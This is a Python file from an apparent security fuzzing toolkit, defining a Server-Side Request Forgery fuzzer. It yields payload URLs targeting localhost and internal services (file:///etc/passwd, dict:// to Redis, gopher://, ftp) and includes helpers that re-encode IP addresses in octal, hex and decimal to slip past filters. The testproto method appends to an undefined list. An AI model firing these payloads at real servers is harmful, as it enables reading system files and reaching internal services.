#!/usr/bin/env python
# -*- coding: utf-8 -*-


from saker.fuzzers.fuzzer import Fuzzer


class SSRF(Fuzzer):

    """Server-Side Request Forgery"""

    def __init__(self):
        super(SSRF, self).__init__()

    @staticmethod
    def testlocal():
        payload = ["http://127.0.0.1"]
        payload += ["http://localhost"]
        payload += ["http://sudo.cc"]  # 127.0.0.1
        payload += ["http://127.0.0.1.xip.io"]
        for p in payload:
            yield p

    @staticmethod
    def testproto():
        payload += ["file:///etc/passwd"]
        payload += ["dict://127.0.0.1:6379/info"]
        payload += ["gopher://127.0.0.1"]
        payload += ["ftp://user:pwd@127.0.0.1"]
        for p in payload:
            yield p

    @staticmethod
    def ip2oct(ip):
        return ".".join(map(lambda i: oct(int(i)), ip.split(".")))

    @staticmethod
    def ip2hex(ip):
        return ".".join(map(lambda i: hex(int(i)), ip.split(".")))

    @staticmethod
    def ip2dec(ip):
        return str(reduce(lambda x, y: (x << 8)+y, map(int, ip.split(".")))).strip("L")

    @staticmethod
    def ip2hexI(ip):
        return hex(reduce(lambda x, y: (x << 8)+y, map(int, ip.split(".")))).strip("L")
